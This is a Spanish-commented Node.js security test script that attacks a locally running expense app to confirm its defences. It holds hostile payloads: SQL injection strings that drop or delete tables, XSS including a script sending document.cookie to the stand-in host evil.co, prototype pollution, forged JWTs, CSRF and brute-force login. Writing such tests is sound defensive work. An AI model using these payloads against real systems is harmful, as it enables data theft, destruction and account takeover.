/**
 * QA ofensivo del Viernes — pruebas cruzadas contra el servidor EN EJECUCIÓN.
 *
 * Uso:
 *   1. npm start           (en otra terminal, con NODE_ENV distinto de production)
 *   2. npm run qa:ataques
 *   Opcional: QA_BASE_URL=http://localhost:3000 npm run qa:ataques
 *             QA_RATE_LIMIT=1 npm run qa:ataques   (incluye la prueba de fuerza bruta; bloquea tu IP 15 min)
 *
 * Cada caso simula lo que haría un atacante saltándose el frontend (como con curl o Postman).
 * Termina con código 1 si alguna defensa falla, para poder usarlo en integración continua.
 */
const crypto = require('crypto');

const BASE_URL = (process.env.QA_BASE_URL || 'http://localhost:3000').replace(/\/+$/, '');
const resultados = [];

/* ---------------- Cliente HTTP con "tarro" de cookies ---------------- */
class Cliente {
  constructor() {
    this.cookies = new Map();
  }

  cabeceraCookie() {
    return [...this.cookies].map(([k, v]) => `${k}=${v}`).join('; ');
  }

  async pedir(ruta, { metodo = 'GET', cuerpo, cabeceras = {}, crudo } = {}) {
    const headers = { Accept: 'application/json', ...cabeceras };
    if (this.cookies.size) headers.Cookie = this.cabeceraCookie();
    if (cuerpo !== undefined || crudo !== undefined) headers['Content-Type'] = 'application/json';

    const respuesta = await fetch(`${BASE_URL}${ruta}`, {
      method: metodo,
      headers,
      body: crudo ?? (cuerpo !== undefined ? JSON.stringify(cuerpo) : undefined),
      redirect: 'manual',
    });

    const setCookies = respuesta.headers.getSetCookie?.() || [];
    for (const linea of setCookies) {
      const [par] = linea.split(';');
      const [nombre, ...valor] = par.split('=');
      const v = valor.join('=');
      if (!v || /Expires=Thu, 01 Jan 1970/i.test(linea)) this.cookies.delete(nombre.trim());
      else this.cookies.set(nombre.trim(), v);
    }

    let json = null;
    const texto = await respuesta.text();
    try {
      json = JSON.parse(texto);
    } catch {
      json = null;
    }
    return { status: respuesta.status, headers: respuesta.headers, json, texto, setCookies };
  }
}

/* ---------------- Utilidades ---------------- */
async function caso(nombre, fn) {
  try {
    const detalle = await fn();
    resultados.push({ ok: true, nombre, detalle: detalle || '' });
  } catch (error) {
    resultados.push({ ok: false, nombre, detalle: error.message });
  }
}

function esperar(condicion, mensaje) {
  if (!condicion) throw new Error(mensaje);
}

const sufijo = `${Date.now()}${crypto.randomInt(1000)}`;
const PASSWORD = 'Segura#2026qa';
const hoy = new Date(Date.now() - new Date().getTimezoneOffset() * 60000).toISOString().slice(0, 10);

function b64url(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

/* ---------------- Casos ---------------- */
async function main() {
  console.log(`\n🧪 QA ofensivo contra ${BASE_URL}\n`);

  try {
    await fetch(`${BASE_URL}/api/health`);
  } catch {
    console.error('✖ El servidor no responde. Ejecuta "npm start" antes de este script.');
    process.exit(1);
  }

  const atacante = new Cliente();
  const victima = new Cliente();

  /* ---- Cabeceras OWASP ---- */
  await caso('Cabeceras: CSP estricta, anti-Clickjacking, nosniff y sin X-Powered-By', async () => {
    const { headers } = await atacante.pedir('/');
    const csp = headers.get('content-security-policy') || '';
    esperar(csp.includes("script-src 'self'") && !csp.includes('unsafe-inline'), `CSP débil: ${csp}`);
    esperar(csp.includes("frame-ancestors 'none'"), 'Falta frame-ancestors');
    esperar(headers.get('x-frame-options') === 'DENY', 'X-Frame-Options no es DENY');
    esperar(headers.get('x-content-type-options') === 'nosniff', 'Falta nosniff');
    esperar(!headers.get('x-powered-by'), 'Se expone X-Powered-By');
    return 'CSP + X-Frame-Options DENY';
  });

  /* ---- Manejo de errores (recomendación del Lunes) ---- */
  await caso('errorHandler: un error interno no filtra stack ni mensajes internos', async () => {
    const r = await atacante.pedir('/api/test/error');
    if (r.status === 404) return 'ruta de prueba desactivada (producción)';
    esperar(r.status === 500, `Esperaba 500, llegó ${r.status}`);
    esperar(!/stack|at\s+\S+\s+\(|intencional/i.test(r.texto), 'La respuesta filtra detalles internos');
    const salud = await atacante.pedir('/api/health');
    esperar(salud.status === 200, 'El servidor dejó de responder tras el error');
    return 'respuesta genérica y servidor vivo';
  });

  /* ---- Registro y cookies ---- */
  await caso('Registro con <script> en el nombre: se guarda sin la etiqueta', async () => {
    const r = await victima.pedir('/api/auth/register', {
      metodo: 'POST',
      cuerpo: {
        nombre: 'Ana<script>alert(document.cookie)</script> Pérez',
        email: `qa.victima.${sufijo}@empresa.com`,
        password: PASSWORD,
        passwordConfirm: PASSWORD,
      },
    });
    esperar(r.status === 201, `Esperaba 201, llegó ${r.status}: ${r.texto}`);
    const nombre = r.json.data.usuario.nombre;
    esperar(!/[<>]|script/i.test(nombre), `Nombre guardado con código: ${nombre}`);
    return `guardado como "${nombre}"`;
  });

  await caso('Cookie de sesión con HttpOnly y SameSite=Strict', async () => {
    const r = await atacante.pedir('/api/auth/register', {
      metodo: 'POST',
      cuerpo: { nombre: 'Atacante QA', email: `qa.atacante.${sufijo}@empresa.com`, password: PASSWORD, passwordConfirm: PASSWORD },
    });
    esperar(r.status === 201, `Registro falló: ${r.status}`);
    const cookie = r.setCookies.find((c) => c.startsWith('auth_token='));
    esperar(cookie, 'No se emitió auth_token');
    esperar(/HttpOnly/i.test(cookie), 'Falta HttpOnly');
    esperar(/SameSite=Strict/i.test(cookie), 'Falta SameSite=Strict');
    return /Secure/i.test(cookie) ? 'HttpOnly; Secure; SameSite=Strict' : 'HttpOnly; SameSite=Strict (Secure desactivado en local)';
  });

  await caso('Registro con payload solo-HTML (<img onerror>) es rechazado', async () => {
    const r = await new Cliente().pedir('/api/auth/register', {
      metodo: 'POST',
      cuerpo: { nombre: '<img src=x onerror=alert(1)>', email: `qa.xss.${sufijo}@empresa.com`, password: PASSWORD, passwordConfirm: PASSWORD },
    });
    esperar(r.status === 422, `Esperaba 422, llegó ${r.status}`);
    return '422 validación';
  });

  await caso('Prototype pollution en registro no otorga rol de aprobador', async () => {
    const cliente = new Cliente();
    const crudo = `{"nombre":"Mallory QA","email":"qa.proto.${sufijo}@empresa.com","password":"${PASSWORD}","passwordConfirm":"${PASSWORD}","__proto__":{"rol":"aprobador"},"rol":"aprobador"}`;
    const r = await cliente.pedir('/api/auth/register', { metodo: 'POST', crudo });
    esperar(r.status === 201, `Registro falló: ${r.status}`);
    esperar(r.json.data.usuario.rol === 'empleado', `Rol obtenido: ${r.json.data.usuario.rol}`);
    return 'rol = empleado';
  });

  /* ---- SQL Injection ---- */
  await caso("SQLi en correo del login (' OR '1'='1' --) es rechazado", async () => {
    const r = await new Cliente().pedir('/api/auth/login', { metodo: 'POST', cuerpo: { email: "' OR '1'='1' --", password: 'x' } });
    esperar(r.status === 422, `Esperaba 422, llegó ${r.status}`);
    return '422 validación';
  });

  await caso('SQLi en contraseña con correo válido no inicia sesión', async () => {
    const r = await new Cliente().pedir('/api/auth/login', {
      metodo: 'POST',
      cuerpo: { email: `qa.victima.${sufijo}@empresa.com`, password: "' OR '1'='1' --" },
    });
    esperar(r.status === 401, `Esperaba 401, llegó ${r.status}`);
    return '401 credenciales';
  });

  await caso('SQLi en descripción se guarda como texto literal y la tabla sigue intacta', async () => {
    const payload = "Taxi'); DROP TABLE gastos; --";
    const r = await atacante.pedir('/api/gastos', {
      metodo: 'POST',
      cuerpo: { descripcion: payload, categoria: 'transporte', montoEnUSD: '12.50', fechaGasto: hoy },
    });
    esperar(r.status === 201, `Esperaba 201, llegó ${r.status}: ${r.texto}`);
    const lista = await atacante.pedir('/api/gastos');
    esperar(lista.status === 200, 'La tabla gastos dejó de responder');
    esperar(lista.json.data.gastos.some((g) => g.descripcion === payload), 'No se encontró el texto literal');
    return `tasa ${r.json.data.tasaAplicada} (${r.json.data.fuenteTasa})`;
  });

  await caso('SQLi en monto (1; DELETE FROM gastos) es rechazado', async () => {
    const r = await atacante.pedir('/api/gastos', {
      metodo: 'POST',
      cuerpo: { descripcion: 'Prueba monto', categoria: 'otros', montoEnUSD: '1; DELETE FROM gastos', fechaGasto: hoy },
    });
    esperar(r.status === 422, `Esperaba 422, llegó ${r.status}`);
    return '422 validación';
  });

  await caso("SQLi en filtro (?estado=aprobado' OR '1'='1) es rechazado", async () => {
    const r = await atacante.pedir(`/api/gastos?estado=${encodeURIComponent("aprobado' OR '1'='1")}`);
    esperar(r.status === 422, `Esperaba 422, llegó ${r.status}`);
    return '422 validación';
  });

  /* ---- XSS almacenado en gastos ---- */
  await caso('XSS en descripción: <script> se elimina antes de guardar', async () => {
    const r = await atacante.pedir('/api/gastos', {
      metodo: 'POST',
      cuerpo: { descripcion: '<script>fetch("//evil.co?c="+document.cookie)</script>Hotel Cartagena', categoria: 'hospedaje', montoEnUSD: '80', fechaGasto: hoy },
    });
    esperar(r.status === 201, `Esperaba 201, llegó ${r.status}: ${r.texto}`);
    esperar(r.json.data.descripcion === 'Hotel Cartagena', `Guardado: ${r.json.data.descripcion}`);
    return 'guardado como "Hotel Cartagena"';
  });

  await caso('XSS con <img onerror> en descripción es rechazado', async () => {
    const r = await atacante.pedir('/api/gastos', {
      metodo: 'POST',
      cuerpo: { descripcion: '<img src=x onerror=alert(1)>', categoria: 'otros', montoEnUSD: '5', fechaGasto: hoy },
    });
    esperar(r.status === 422, `Esperaba 422, llegó ${r.status}`);
    return '422 validación';
  });

  /* ---- Tokens ---- */
  await caso('Ruta protegida sin cookie responde 401', async () => {
    const r = await new Cliente().pedir('/api/gastos');
    esperar(r.status === 401, `Esperaba 401, llegó ${r.status}`);
    return '401';
  });

  await caso('JWT falsificado con "alg: none" es rechazado', async () => {
    const cliente = new Cliente();
    cliente.cookies.set('auth_token', `${b64url({ alg: 'none', typ: 'JWT' })}.${b64url({ id: 1, rol: 'aprobador', tv: 0, typ: 'access' })}.`);
    const r = await cliente.pedir('/api/gastos/pendientes');
    esperar(r.status === 401, `Esperaba 401, llegó ${r.status}`);
    return '401';
  });

  await caso('JWT firmado con otra clave es rechazado', async () => {
    const cabecera = b64url({ alg: 'HS256', typ: 'JWT' });
    const cuerpo = b64url({ id: 1, rol: 'aprobador', tv: 0, typ: 'access', iss: 'fintech-core', aud: 'fintech-core-web', exp: Math.floor(Date.now() / 1000) + 3600 });
    const firma = crypto.createHmac('sha256', 'clave-adivinada-por-el-atacante').update(`${cabecera}.${cuerpo}`).digest('base64url');
    const cliente = new Cliente();
    cliente.cookies.set('auth_token', `${cabecera}.${cuerpo}.${firma}`);
    const r = await cliente.pedir('/api/gastos');
    esperar(r.status === 401, `Esperaba 401, llegó ${r.status}`);
    return '401';
  });

  /* ---- Control de acceso ---- */
  await caso('Empleado no puede aprobar gastos (403)', async () => {
    const lista = await victima.pedir('/api/gastos');
    const r = await atacante.pedir('/api/gastos/1/estado', { metodo: 'PATCH', cuerpo: { estado: 'aprobado' } });
    esperar(lista.status === 200, 'La víctima no pudo listar');
    esperar(r.status === 403, `Esperaba 403, llegó ${r.status}`);
    return '403';
  });

  await caso('Un usuario no ve los gastos de otro', async () => {
    const r = await victima.pedir('/api/gastos');
    esperar(r.json.data.gastos.every((g) => !/Hotel Cartagena|DROP TABLE/.test(g.descripcion)), 'Se filtraron gastos del atacante');
    return `la víctima ve ${r.json.data.gastos.length} gastos propios`;
  });

  /* ---- CSRF / tamaño ---- */
  await caso('POST desde un origen externo es bloqueado (anti-CSRF)', async () => {
    const r = await atacante.pedir('/api/gastos', {
      metodo: 'POST',
      cabeceras: { Origin: 'https://sitio-malicioso.example' },
      cuerpo: { descripcion: 'CSRF', categoria: 'otros', montoEnUSD: '1', fechaGasto: hoy },
    });
    esperar(r.status === 403, `Esperaba 403, llegó ${r.status}`);
    return '403';
  });

  await caso('Cuerpo mayor a 10 kB es rechazado (413)', async () => {
    const r = await atacante.pedir('/api/gastos', { metodo: 'POST', crudo: JSON.stringify({ descripcion: 'x'.repeat(20000) }) });
    esperar(r.status === 413, `Esperaba 413, llegó ${r.status}`);
    return '413';
  });

  /* ---- Revocación ---- */
  await caso('Tras cerrar sesión, el token copiado deja de servir', async () => {
    const tokenRobado = atacante.cookies.get('auth_token');
    await atacante.pedir('/api/auth/logout', { metodo: 'POST' });
    const ladron = new Cliente();
    ladron.cookies.set('auth_token', tokenRobado);
    const r = await ladron.pedir('/api/gastos');
    esperar(r.status === 401, `Esperaba 401, llegó ${r.status}`);
    return 'token revocado';
  });

  /* ---- Fuerza bruta (opcional) ---- */
  if (process.env.QA_RATE_LIMIT === '1') {
    await caso('Fuerza bruta en login activa el rate limit (429)', async () => {
      let ultimo = 0;
      for (let i = 0; i < 15 && ultimo !== 429; i += 1) {
        const r = await new Cliente().pedir('/api/auth/login', {
          metodo: 'POST',
          cuerpo: { email: `qa.victima.${sufijo}@empresa.com`, password: `Intento#${i}` },
        });
        ultimo = r.status;
      }
      esperar(ultimo === 429, `Nunca llegó 429 (último: ${ultimo})`);
      return '429 tras intentos fallidos';
    });
  }

  /* ---- Reporte ---- */
  let fallos = 0;
  for (const r of resultados) {
    if (!r.ok) fallos += 1;
    console.log(`${r.ok ? '✔' : '✖'} ${r.nombre}${r.detalle ? `  →  ${r.detalle}` : ''}`);
  }
  console.log(`\n${resultados.length - fallos}/${resultados.length} defensas verificadas.`);
  if (process.env.QA_RATE_LIMIT !== '1') console.log('(Prueba de fuerza bruta omitida: usa QA_RATE_LIMIT=1 para incluirla.)');
  process.exitCode = fallos ? 1 : 0;
}

main();
